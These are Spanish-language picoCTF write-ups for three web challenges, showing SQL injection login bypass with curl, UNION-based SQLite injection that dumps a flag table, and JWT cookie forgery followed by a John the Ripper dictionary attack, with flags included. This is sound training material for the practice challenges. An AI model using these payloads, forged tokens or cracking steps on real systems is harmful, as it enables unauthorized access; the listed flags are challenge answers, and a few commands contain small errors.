
# Irish-Name-Repo 1

There is a website running at https://jupiter.challenges.picoctf.org/problem/33850/ http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
Try to think about how the website verifies your login.


## Desde navegador

1. Ingresamos a la página
2. No tenemos la contraseña para ingresar
3. Inspeccionar
4. Cambiamos el valor del campo debug de 0 a 1
```
 <input type="hidden" name="debug" value="0">
 <input type="hidden" name="debug" value="1">
```
5. Volvemos a lanzar la petición de acceso
6. Seguimos sin poder ingresa pero conocemos la forma en la que se valida el usuario
```
username: admin
password: holamundo (yo la ingrese)
SQL query: SELECT * FROM users WHERE name='admin' AND password='holamundo'

# Login failed.
```
7. Usamos una inyección SQL básica y obtenemos la bandera
```
username: admin
password: ' or 1==1;

output:
# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```

Al usar la sentencia `' or 1==1;` obtenemos la sentencia query `SELECT * FROM users WHERE name=='admin' AND password=='' or 1==1;'`, la cual es verdadera y permite el acceso.


## Desde consola

1. Abrimos una terminal
2. Usamos el comando curl
```
curl -s https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=holamundo&debug=1"
```
Aunque el link original es .html, lo cambiamos a .php porque en el código fuente pudimos ver que la petición se redirecciona a este sitio
```
<form action="[login.php](view-source:https://jupiter.challenges.picoctf.org/problem/33850/login.php)" method="POST">
```
3. Usamos la inyección
```
curl -s https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=' or 1==1;&debug=1"
```
4. Obtenemos la bandera
```
<pre>username: admin
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_f8adf3fb}</p>  
```


**Fuentes:**

- [Video explicación](https://www.youtube.com/watch?v=0EDbUSDqrng&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=7&t=47s)
- [sql injection](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbDVrMVIzb2RYUm14MVdrUnlXTFR4OUNQZWpvd3xBQ3Jtc0ttS1IwNXpNZzBuT3hVY1NYR0E2SlFvYmc5S2xtdHBrSnByd3hxVTZFak13b3FsVlBBbFU4V2N1UU5nSmtaSnVKUUFEUGl3aGp5My02clVPV004dVoxNzhCTmtSVUhqM1dJOXBlTUpNcjV6dFlyeUU3OA&q=https%3A%2F%2Fwww.w3schools.com%2Fsql%2Fsql_injection.asp&v=0EDbUSDqrng)



# More SQLi

Can you find the flag on this website. Try to find the flag [here](http://saturn.picoctf.net:54524/).

## Desde navegador

1. Vamos a la página
2. Intentamos ingresa con un usuario y contraseña random
```
username: admin
password: holamundo
SQL query: SELECT id FROM users WHERE password = 'holamundo' AND username = 'admin'
```
3. Probamos con la inyección `' or 1==1;La inyección SQL varía según el motor de la base de datos.`
4. Ingresamos. Ahora debemos encontrar la bandera en alguna tabla de la base de datos.
5. Primero, debemos conocer la versión del motor. Ingreamos los comandos en el campo de búsqueda.
```
' union select sqlite_version(),2,3...[n columna];

output: 3.31.1
```
6. Intentamos con dos comando para extraer la estructura de las tablas
```
' union select sql,2,3 from sqlite_schema;

output: None
```

```
' union select sql,2,3 from sqlite_master;

output: obtenemos la estructura y encontramos una tabla que podría estar relacionada con el reto
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
```
7. Extraemos los datos de la tabla
```
' union select id,flag,3 from more_table;
```
8. Encontramos la bandera
```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}
```


## Desde BurpSuite

1. Ingresamos a la página
2. Interceptamos la inyección
3. Vamos la solicitud inicial
4. Vamos a la respuesta
5. Obtenemos la bandera


**Fuentes:**
- [Video explicación](https://www.youtube.com/watch?v=clMe4yqL6yU)
- [Web Explotation - More SQLi](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbG92dmhFUXdpUVE4RklFTUhvMHNBYlhqeldjQXxBQ3Jtc0ttYUxQWUdLcFRoNFhiRWhEcUlibWFNTGw0ZDh5azNVM3F5VlpZdDZ3T1NUTWhFeG5qX2xOamRzTmZCelZjNHVOaGN0MlJmdU9oYWlWY2E0TF9RclpySG0wREp2TkxkTWU4Q3hJWWlkbG1sWUxCTG5FYw&q=https%3A%2F%2Fplay.picoctf.org%2Fpractice%2Fchallenge%2F358&v=clMe4yqL6yU)



# JaWT Scratchpad

Internal server errors can be intentionally returned by this challenge. If you experience one, try clearing your cookies.
What is that cookie?
Have you heard of JWT?

1. Ingresamos a la página
2. No nos permite usar el nombre de usuario 'admin' para ingresar
3. Accedemos con otro nombre de usuario
4. Revisamos las cookies
5. Buscamos el token jwt y lo copiamos
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoic2FpbG9yayJ9.PJjfmTRDNYPGIhi_ZtoCUPQ1DKOTl1oAAUtB8Ypd6E0
```
5. Vamos a la jwt.io y pegamos en la parte de debugger para decodificarlo
6. Asignamos "admin" en user. Copiamos el nuevo token
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.-vh-85mhRjMzTUsaJEWhgJwu-_EzDOy8zI0a9dik2Ww
```
7. Enviamos otra petición con el nuevo token
```
output: 
# Internal Server Error

The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
```
La cookie no se puede cambiar tan fácil, tiene un password que no conocemos. Así que tendremos que crakearla.
8. Borramos la cookie modificada y volvemos a hacer una petición
9. Copiamos la cookie original y la pegamos en un archivo en terminal
```
nano [nombre_archivo]

cat [nombre_archivo]
output: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoic2FpbG9yayJ9.PJjfmTRDNYPGIhi_ZtoCUPQ1DKOTl1oAAUtB8Ypd6E0 
```
10. Haremos un ataque de diccionario. Revisamos la lista de palabras de palabras para probar
```
ls /usr/share/wordlists
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```
11. Revisamos lo que hay dentro de rockyou.txt
```
head /usr/share/wordlists/rockyou.txt

output:
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```
12. Instalamos la herramienta de crakeo 
```
sudo apt install john  
```
13. Ingresamos la cookie en John
```
john [nombre_archivo] -w-/usr/share/wordlists/rockyou.txt
```


**Fuentes:**
- [Video explicación](https://www.youtube.com/watch?v=iaKbvrbcSko)
- [Web - JaWT Scratchpad](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqa1JxbzdMdmVkbmpjSTZsZ2otT0xDZXZQTF9PUXxBQ3Jtc0trRENPR2k1RG1jNFNPQkZZZXFscXYyQ2JvVTdaX255YnVKTXRzNkk4QzB3UnFhZXg3OHRka05xQ2RBdS1LWWQyMXh4WkNsWWVscG84dFVfSmF3ODhmSGFXY0dpcnhOUWFkYTFNdEg3dDFscm44ZG1Caw&q=https%3A%2F%2Fplay.picoctf.org%2Fpractice%2Fchallenge%2F25&v=iaKbvrbcSko)
- [Herramienta para craking](https://github.com/openwall/john)